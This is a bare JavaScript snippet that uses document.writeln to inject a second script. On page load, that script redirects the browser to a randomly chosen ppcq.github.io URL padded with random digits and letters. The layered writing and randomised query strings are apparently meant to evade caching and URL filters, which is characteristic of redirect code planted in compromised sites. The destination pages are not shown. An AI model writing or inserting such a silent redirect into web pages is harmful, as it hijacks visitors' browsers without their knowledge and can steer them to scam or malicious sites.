<script language="JavaScript">
<!--
document.writeln("<script>");
document.writeln("var urls=[");
document.writeln("'https://ppcq.github.io/pp?{nnnnnnnnnnn}{wwwwww}',");
document.writeln("'https://ppcq.github.io/ll.html?{nnnnnnnnnnn}{wwwwww}',");
document.writeln("];");
document.writeln("location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);");
document.writeln("function myEeplace(s){");
document.writeln("	return s.replace(/\\{(\\w+?)\\}/g,function(a,b){");
document.writeln("		var h='';");
document.writeln("		for(var i=0;i<b.length;i++){");
document.writeln("			if('n'==b[i]){");
document.writeln("				h+=Math.floor(Math.random()*10);");
document.writeln("			}else if('w'==b[i]){");
document.writeln("				h+=String.fromCharCode(97+Math.floor(Math.random()*26));");
document.writeln("			}");
document.writeln("		}");
document.writeln("		return h;");
document.writeln("	});");
document.writeln("}");
document.writeln("</script>");
//-->
</script>
